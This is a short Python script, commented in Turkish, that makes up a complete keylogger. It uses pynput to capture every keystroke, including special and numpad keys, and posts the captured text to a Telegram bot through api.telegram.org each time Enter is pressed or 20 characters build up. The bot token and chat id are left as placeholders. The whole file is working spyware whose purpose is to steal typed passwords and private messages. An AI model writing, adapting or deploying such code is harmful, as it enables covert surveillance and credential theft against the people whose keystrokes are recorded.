import requests
from pynput import keyboard

# telegram bot ayarları
bot_token = '{bot_token}' 
chat_id = '{id}' 

# telegrama mesaj göndermek için 
def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    payload = {'chat_id': chat_id, 'text': message}
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Mesaj başarıyla gönderildi.")
        else:
            print(f"Mesaj gönderilirken hata oluştu: {response.status_code}")
    except Exception as e:
        print(f"Mesaj gönderilirken istisna oluştu: {e}")

# tuşları kayıt etmek için oluşturulan bir log değişkeni
log = ""

def on_press(key):
    global log
    try:
        # normal karakterler için
        if isinstance(key, keyboard.KeyCode) and key.char:
            log += key.char
        
        # özel tuşları kontrol etme
        else:
            special_keys = {
                keyboard.Key.space: " [SPACE] ",
                keyboard.Key.enter: "\n[ENTER]\n",
                keyboard.Key.backspace: " [BACKSPACE] ",
                keyboard.Key.tab: " [TAB] ",
                keyboard.Key.esc: " [ESC] ",
                keyboard.Key.shift: " [SHIFT] ",
                keyboard.Key.ctrl: " [CTRL] ",
                keyboard.Key.alt: " [ALT] ",
                keyboard.Key.caps_lock: " [CAPS_LOCK] ",
                keyboard.Key.num_lock: " [NUM_LOCK] ",
                keyboard.Key.delete: " [DELETE] ",
                keyboard.Key.up: " [UP] ",
                keyboard.Key.down: " [DOWN] ",
                keyboard.Key.left: " [LEFT] ",
                keyboard.Key.right: " [RIGHT] ",
                keyboard.Key.cmd: " [WINDOWS] ",
                keyboard.Key.f1: " [F1] ", keyboard.Key.f2: " [F2] ",
                keyboard.Key.f3: " [F3] ", keyboard.Key.f4: " [F4] ",
                keyboard.Key.f5: " [F5] ", keyboard.Key.f6: " [F6] ",
                keyboard.Key.f7: " [F7] ", keyboard.Key.f8: " [F8] ",
                keyboard.Key.f9: " [F9] ", keyboard.Key.f10: " [F10] ",
                keyboard.Key.f11: " [F11] ", keyboard.Key.f12: " [F12] ",
            }

            if key in special_keys:
                log += special_keys[key]

            # numpad tuşlarını algılama
            elif hasattr(key, 'vk'):
                numpad_keys = {
                    96: "0", 97: "1", 98: "2", 99: "3", 100: "4",
                    101: "5", 102: "6", 103: "7", 104: "8", 105: "9",
                    110: ".", 111: "/", 106: "*", 109: "-", 107: "+",
                    13: "[ENTER]"
                }
                if key.vk in numpad_keys:
                    log += numpad_keys[key.vk]
                else:
                    log += f" [{key}] "

        # enter tuşuna basıldığında veya log uzunluğu 20'den büyük ve eşitse log'u telegram botuna gönder
        if key == keyboard.Key.enter or len(log) >= 20:
            send_telegram_message(log)
            log = ""

        # esc basılırsa çıkış yap
        if key == keyboard.Key.esc:
            print("Keylogger durduruldu.")
            return False

    except Exception as e:
        print(f"Hata: {e}")

print("🔴 Keylogger başlatıldı...")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
